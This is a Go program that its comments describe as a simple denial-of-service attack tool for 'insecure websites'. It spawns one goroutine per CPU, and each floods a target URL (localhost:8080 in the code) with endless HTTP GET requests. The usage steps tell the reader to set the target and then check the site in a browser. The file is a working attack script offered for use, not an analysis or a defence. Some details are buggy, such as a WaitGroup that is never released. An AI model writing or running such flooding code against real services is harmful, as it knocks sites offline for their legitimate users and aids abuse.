// Simple Dos Attack with Concurrency.
// Works well on Insecure websites and web applications.

// How It works?
//1. Just Set up max go routines which to achive Distributed attack.
//2. Each Routine does infinite number of request to attack url .
//3. After few micro seconds, try to vist the attack url via browser.
//4. Boom !!!

package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"sync"
)

func main() {

	logFile, err := os.OpenFile("DOSSimple/attack.log", os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0777)
	if err != nil {
		fmt.Printf("Error in openning log file: %s", err.Error())
		os.Exit(1)
	}

	log.SetOutput(logFile)

	attackUrl := "http://localhost:8080/"

	maxProcess := 0
	if nCPU := runtime.NumCPU(); nCPU > 1 {
		maxProcess = runtime.GOMAXPROCS(nCPU)
		log.Println("INFO: maxProcess, nCPU - ", maxProcess, nCPU)
	}

	var wg sync.WaitGroup
	wg.Add(maxProcess)
	for i := 0; i < maxProcess; i++ {
		process := "PROCS[" + strconv.Itoa(i) + "]"
		go attackService(attackUrl, process)
		log.Print("check", i)
	}

	wg.Wait()
}

func attackService(attackUrl string, routine string) {
	i := 0
	for {
		_, err := http.Get(attackUrl)
		if err != nil {
			log.Printf("Error in %s, times %s - error: %+v", routine, i, err.Error())
			i++
			continue
		}

		i++
		log.Printf("routine: %+v  times: %+v", routine, i)
	}
}
